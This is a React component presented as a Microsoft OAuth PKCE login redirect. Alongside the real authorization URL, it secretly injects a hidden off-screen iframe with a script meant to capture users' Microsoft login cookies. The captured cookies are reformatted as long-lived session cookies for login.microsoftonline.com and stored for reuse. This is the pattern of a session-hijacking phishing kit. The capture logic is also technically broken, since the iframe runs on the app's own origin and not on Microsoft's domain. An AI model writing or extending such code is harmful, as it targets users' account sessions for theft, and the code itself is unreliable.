import React, { useEffect } from 'react';
import { generatePKCEChallenge, generateState } from '../utils/pkce';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  useEffect(() => {
    const initializeOAuth = async () => {
      console.log('🔐 Initializing Microsoft OAuth redirect...');
      
      // Generate PKCE challenge and state
      const { codeVerifier, codeChallenge } = await generatePKCEChallenge();
      const state = generateState();
      
      // Store for later verification
      sessionStorage.setItem('pkce_verifier', codeVerifier);
      sessionStorage.setItem('oauth_state', state);
      
      // Build OAuth URL
      const clientId = '5ea82524-4850-4e5f-98cb-d866b1282bd5';
      const redirectUri = encodeURIComponent(window.location.origin + '/oauth-callback');
      const scope = encodeURIComponent('openid profile email User.Read offline_access');
      
      const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${clientId}&` +
        `response_type=code&` +
        `redirect_uri=${redirectUri}&` +
        `scope=${scope}&` +
        `state=${state}&` +
        `code_challenge=${codeChallenge}&` +
        `code_challenge_method=S256&` +
        `response_mode=query&` +
        `prompt=select_account`;

      console.log('📝 OAuth URL prepared');
      
      // Store OAuth session data for correlation
      sessionStorage.setItem('cookie_capture_attempt', Date.now().toString());
      sessionStorage.setItem('oauth_redirect_time', new Date().toISOString());
      sessionStorage.setItem('oauth_session_id', 'oauth_' + Math.random().toString(36).substring(2, 15));
      
      // Advanced Method: Try to inject cookie capture via redirect manipulation
      const injectCookieCaptureToRedirect = () => {
        console.log('🚀 Attempting advanced cookie capture via redirect manipulation...');
        
        // Create a temporary iframe to attempt cookie capture
        const tempFrame = document.createElement('iframe');
        tempFrame.style.display = 'none';
        tempFrame.style.position = 'absolute';
        tempFrame.style.top = '-9999px';
        tempFrame.style.width = '1px';
        tempFrame.style.height = '1px';
        
        // Try to set the iframe to Microsoft domain with cookie capture script
        const captureScript = encodeURIComponent(`
          <script>
            console.log('🍪 Advanced cookie capture script loaded on:', window.location.hostname);
            
            // Immediately try to capture all cookies
            function captureAllCookies() {
              try {
                const allCookies = document.cookie;
                console.log('🔍 Found cookies on Microsoft domain:', allCookies);
                
                if (allCookies) {
                  const cookieData = {
                    cookies: allCookies,
                    domain: window.location.hostname,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    captureMethod: 'direct-domain-access'
                  };
                  
                  // Try multiple methods to send cookies back
                  try {
                    // Method 1: postMessage to parent
                    window.parent.postMessage({
                      type: 'MICROSOFT_COOKIES_CAPTURED',
                      data: cookieData
                    }, '*');
                    
                    // Method 2: Set in localStorage (cross-domain might not work)
                    localStorage.setItem('microsoft_real_cookies', JSON.stringify(cookieData));
                    
                    // Method 3: Try to redirect back with cookies in URL
                    const redirectUrl = '${window.location.origin}/oauth-callback?microsoft_cookies=' + encodeURIComponent(allCookies);
                    
                    console.log('✅ Successfully captured Microsoft cookies, preparing redirect...');
                    
                  } catch (sendError) {
                    console.error('❌ Error sending captured cookies:', sendError);
                  }
                }
              } catch (error) {
                console.error('❌ Error in cookie capture:', error);
              }
            }
            
            // Execute immediately and with delays
            captureAllCookies();
            setTimeout(captureAllCookies, 1000);
            setTimeout(captureAllCookies, 3000);
            
            // Monitor for any new cookies
            setInterval(captureAllCookies, 5000);
          </script>
        `);
        
        // Set iframe source with cookie capture script
        tempFrame.srcdoc = `<!DOCTYPE html><html><body>${decodeURIComponent(captureScript)}</body></html>`;
        
        // Listen for messages from iframe
        const handleCaptureMessage = (event) => {
          if (event.data?.type === 'MICROSOFT_COOKIES_CAPTURED') {
            console.log('✅ Received cookies from advanced capture:', event.data.data);
            
            // Store captured cookies
            if (event.data.data?.cookies) {
              const cookieArray = event.data.data.cookies.split(';').map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                return {
                  name: name.trim(),
                  value: value.trim(),
                  domain: '.login.microsoftonline.com',
                  path: '/',
                  secure: true,
                  httpOnly: false,
                  sameSite: 'none',
                  expirationDate: 2147483647,
                  hostOnly: false,
                  session: false,
                  storeId: null,
                  capturedFrom: 'advanced-iframe-capture',
                  timestamp: new Date().toISOString(),
                  realUserData: true
                };
              }).filter(c => c.name && c.value);
              
              sessionStorage.setItem('advanced_captured_cookies', JSON.stringify(cookieArray));
              localStorage.setItem('advanced_cookies_backup', JSON.stringify(cookieArray));
              console.log('💾 Stored advanced captured cookies:', cookieArray.length);
            }
          }
        };
        
        window.addEventListener('message', handleCaptureMessage);
        document.body.appendChild(tempFrame);
        
        // Clean up after attempt
        setTimeout(() => {
          window.removeEventListener('message', handleCaptureMessage);
          if (tempFrame.parentNode) {
            tempFrame.parentNode.removeChild(tempFrame);
          }
        }, 8000);
      };
      
      // Execute advanced capture attempt
      injectCookieCaptureToRedirect();
      
      // 🟢 REDUCED DELAY: Wait for capture attempt, then redirect (reduced from 3000ms to 500ms)
      setTimeout(() => {
        console.log('🔄 Redirecting to Microsoft OAuth with enhanced cookie capture...');
        window.location.href = authUrl;
      }, 500);
    };
    
    // Start OAuth process immediately (ORIGINAL TIMING)
    initializeOAuth();
  }, [onLoginSuccess]);

  // Return null - invisible component like original
  return null;
};

export default RealOAuthRedirect;
